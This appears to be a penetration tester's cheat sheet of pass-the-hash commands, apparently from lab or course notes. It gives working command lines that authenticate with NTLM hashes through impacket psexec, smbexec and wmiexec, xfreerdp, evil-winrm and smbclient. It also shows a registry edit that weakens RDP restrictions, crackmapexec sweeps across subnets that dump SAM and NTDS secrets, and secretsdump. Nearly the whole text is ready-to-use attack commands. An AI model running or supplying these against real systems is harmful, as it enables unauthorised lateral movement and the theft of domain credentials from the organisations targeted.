https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491

# PSExec
```bash
impacket-psexec corp.com/dave@192.168.196.248 -hashes :56e4633688c0fdd57c610faf9d7ab8df
```

-----------------------

# SMBExec
```bash
impacket-smbexec relia/dan@192.168.196.248 -hashes :4b22394fc907bd7a74d1af6cc9aca348
```

-----------------------

# WMIexec
```bash
impacket-wmiexec relia/dan@192.168.196.248 -hashes :4b22394fc907bd7a74d1af6cc9aca348
```

-----------------------

# RDP
```bash
# Activate from shell
impacket-psexec corp.com/dave@192.168.214.75 -hashes :08d7a47a6f9f66b97b1bae4178747494
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Activate remote
smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# Pass the hash
xfreerdp /cert-ignore /u:dave /d:corp.com /pth:08d7a47a6f9f66b97b1bae4178747494 /v:192.168.214.75
```

-----------------------

# CRACKMAPEXEC
```bash
crackmapexec smb 192.168.196.0/24 -u dmzadmin -H ae78a6fea976b71e09e990b903020af6 --continue-on-success
crackmapexec winrm 192.168.196.0/24 -u dmzadmin -H ae78a6fea976b71e09e990b903020af6 --continue-on-success
crackmapexec winrm 192.168.196.10 -u user -H ae78a6fea976b71e09e990b903020af6 --hashes --sam --ntds
```

-----------------------

# EVIL-WINRM
```bash
evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
```

-----------------------

# SMBCLIENT
```bash
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
```

-----------------------



# SECRETSDUMP
```bash
impacket-secretsdump ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

-----------------------

